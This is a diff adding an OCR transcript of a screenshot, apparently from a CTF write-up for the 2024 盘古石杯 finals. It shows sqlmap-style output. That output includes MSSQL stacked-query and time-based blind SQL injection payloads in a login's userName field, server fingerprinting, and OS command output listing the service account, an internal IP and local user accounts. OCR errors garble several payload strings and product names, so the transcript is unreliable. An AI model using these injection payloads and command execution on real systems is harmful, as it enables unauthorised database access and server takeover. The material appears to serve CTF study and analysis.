@@ -1,0 +1,22 @@
+# OCR: 43ab96b73870cfcd69cf79ba59c9ce58.jpg
+# 来源: ./02-WriteUp/2024/2024-盘古石杯-总决赛/43ab96b73870cfcd69cf79ba59c9ce58.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:15
+
+Hlog区
+97 98 99 100 101 102 103 104 105
+106 107 108 109 110 111 112 113 114 115 116 117 118 119 120
+Type: stacked queries
+Title: Microsoft sQL server/sybase stacked queries (comment)
+Payload:userName=admin';WAITFOR DELAY0:0:5I--&password=admin Type: time-based blind
+Title: Microsoft sQL server/sybase time-based blind (IF - comment) Payload:userName-admin' WAITFOR DELAY'0:0:5'--&password=admin
+webserveroperatingsystem:windows7or2oo8 R2
+web application technology:AsP.NET,Microsoft IIs 7.5,AsP.NET 4.0.3o319 back-endDBMs:MicrosoftsQLServer2oi4
+command standard output:ntservicelmssglserver commandstandardoutput：IPv4地址
+172.16.0.137
+command standard output: 的用户帐户
+adminl delete
+administraotrl Guest
+命令运行完毕，但发生一个或多个错误。
+Administrator
